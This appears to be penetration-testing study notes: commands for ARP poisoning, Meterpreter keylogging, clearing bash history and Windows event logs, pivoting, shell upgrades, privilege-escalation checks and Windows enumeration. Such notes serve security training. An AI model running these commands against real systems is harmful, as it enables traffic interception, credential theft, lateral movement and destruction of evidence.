# 1 Info Gathering and Enumeration


# 2 Exploitation
## ARP Poisoning
```
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```
```
arpspoof -i <interface> -t <ip1> -r <ip2>
```
```
sudo wireshark -i <interface> -k
```



# 3 Post-Exploitation
- Keylogging
- Cleanup Resource Scripts
- Clear Linux History
- Clear Windows Event Logs
- Pivoting
- SUDO Privileges
- SUID Binaries
- Upgrade Shells
- Windows Local Enumeration
- Working Directories

## Keylogging
```
meterpreter > getdesktop
```
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
```
meterpreter > migrate -N winlogon.exe
```

## Cleanup Resource Scripts
```
meterpreter > resource <path_to_cleanup_rc_file>
```

## Clear Linux History
```
cat /dev/null > ~/.bash_history
history -c
```

## Clear Windows Event Logs
```
meterpreter > clearev
```

## Pivoting
```
meterpreter > ipconfig
meterpreter > arp
```
```
meterpreter > run autoroute -s <subnet_in_cidr>
meterpreter > run autoroute -p
```
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip2>
```
```
meterpreter > portfwd add -l <local_port_on_kali> -p <remote_port_on_ip2> -r <ip2>
meterpreter > portfwd list
```
```
netstat -an | grep LISTEN
nmap -Pn -sV -p<local_port_on_kali> localhost
```
```
use <exploit_module>
set RHOSTS <ip2>
set payload windows/meterpreter/bind_tcp
```
- `LPORT` will be opened on `<ip2>`.

## SUDO Privileges
```
sudo -l
```
- https://gtfobins.github.io/

## SUID Binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## Upgrade Shells
- Non-interactive to interactive
```
cat /etc/shells
/bin/bash -i
```
```
which python python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
which python python3
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

echo $TERM
stty -a
stty raw -echo
fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <no_of_rows> columns <no_of_columns>
```

- Non-meterpreter to meterpreter
```
sessions -u <session_id>
```
```
use post/multi/manage/shell_to_meterpreter
set LHOST <ip>
set SESSION <session_id>
set WIN_TRANSFER VBS
```

## Windows Local Enumeration
- Enumerating System Information
```
meterpreter > sysinfo

hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
dir /b/s eula.txt
```

- Enumerating Users & Groups
```
meterpreter > getuid
meterpreter > getprivs

whoami
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <group>
net localgroup Administrators

use post/windows/gather/enum_logged_on_users
set SESSION <session_id>
```

- Enumerating Network Information
```
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```
- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output.

- Enumerating Processes & Services
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>

net start
wmic service list brief
tasklist
tasklist /SVC

mkdir C:\Temp
schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
exit

meterpreter > download C:\\Temp\\schtasks.txt
```

- Automating Windows Local Enumeration
```
meterpreter > show_mount

use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/enum_computers
use post/windows/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

- JAWS - Just Another Windows Script
```
meterpreter > mkdir C:\\Temp
meterpreter > cd C:\\Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
exit

meterpreter > download C:\\Temp\\jaws-enum.txt
```
- https://github.com/411Hall/JAWS

## Working Directories
- Windows: `C:\Temp`
- Linux: `/tmp`
